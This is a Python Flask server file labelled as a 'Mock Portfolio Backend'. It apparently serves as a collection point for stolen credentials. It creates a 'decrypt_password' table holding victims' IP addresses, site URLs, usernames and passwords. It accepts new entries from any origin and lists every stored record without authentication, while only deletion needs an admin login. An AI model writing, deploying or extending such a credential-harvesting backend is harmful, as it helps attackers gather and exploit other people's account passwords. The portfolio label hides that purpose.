import sqlite3
from flask import Flask, request, jsonify, render_template_string, Response, session, send_from_directory
from flask_cors import CORS
from functools import wraps
from dotenv import load_dotenv
import os

# Load environment variables from .env file
load_dotenv()

app = Flask(__name__)
CORS(app)

DATABASE = 'database.db'
PORT = int(os.environ.get('PORT', 5000))

# Fetch admin credentials from environment variables
ADMIN_USERNAME = os.getenv('ADMIN_USERNAME')
ADMIN_PASSWORD = os.getenv('ADMIN_PASSWORD')

def init_db():
    # Connect to the database and create the table
    conn = sqlite3.connect(DATABASE)
    cursor = conn.cursor()
    
    # Create Table if it does not exist
    cursor.execute(''' 
                    CREATE TABLE IF NOT EXISTS decrypt_password (
                        id INTEGER PRIMARY KEY,
                        ip TEXT NOT NULL,
                        url TEXT NOT NULL,
                        username TEXT,
                        password TEXT NOT NULL,
                        timestamp TEXT DEFAULT CURRENT_TIMESTAMP
                    )
                    ''')
    conn.commit()
    conn.close()
    
def get_db_connection():
    conn = sqlite3.connect(DATABASE)
    conn.row_factory = sqlite3.Row
    return conn

# Basic Admin Auth Decorator
def require_admin(func):
    @wraps(func)
    def decorated_function(*args, **kwargs):
        auth = request.authorization
        if not auth or auth.username != ADMIN_USERNAME or auth.password != ADMIN_PASSWORD:
            return jsonify({"message": "Unauthorized"}), 401
        return func(*args, **kwargs)
    return decorated_function

@app.route('/')
def home():
    return "This is Mock Portfolio Backend"

@app.route('/api/get-ip', methods=['GET'])
def get_user_ip():
    user_ip = request.remote_addr
    forwarded_ip = request.headers.get('X-Forwarded-For', '').split(',')[0].strip()
    real_ip = forwarded_ip or user_ip
    return jsonify({"ip": real_ip})

@app.route('/api/user-data', methods=['GET'])
def get_user_data():
    conn = get_db_connection()
    cursor = conn.cursor()
    
    cursor.execute('SELECT * FROM decrypt_password')
    rows = cursor.fetchall()
    
    # Return the data as JSON
    data = []
    for row in rows:
        data.append(dict(row))
    
    return jsonify(data)

@app.route('/api/user-data', methods=['POST'])
def add_user_data():
    # Get data from the request
    data = request.get_json()
    ip = data.get('ip')
    url = data.get('url')
    username = data.get('username')
    password = data.get('password')
    
    # Insert the new record into the database
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute('''
        INSERT INTO decrypt_password (ip, url, username, password) 
        VALUES (?, ?, ?, ?)
    ''', (ip, url, username, password))
    conn.commit()
    conn.close()
    
    return jsonify({"message": "User data added successfully"}), 201

@app.route('/api/user-data/<int:id>', methods=['DELETE'])
@require_admin
def delete_user_data(id):
    # Delete the record with the specified ID
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute('DELETE FROM decrypt_password WHERE id = ?', (id,))
    conn.commit()
    conn.close()
    
    return jsonify({"message": "User data deleted successfully"})

@app.route('/api/user-data', methods=['DELETE'])
@require_admin
def delete_all_user_data():
    # Delete all records from the decrypt_password table
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute('DELETE FROM decrypt_password')
    conn.commit()
    conn.close()
    
    return jsonify({"message": "All user data deleted successfully"})

if __name__ == '__main__':
    # Initialize the database
    init_db()
    app.run(debug=False)
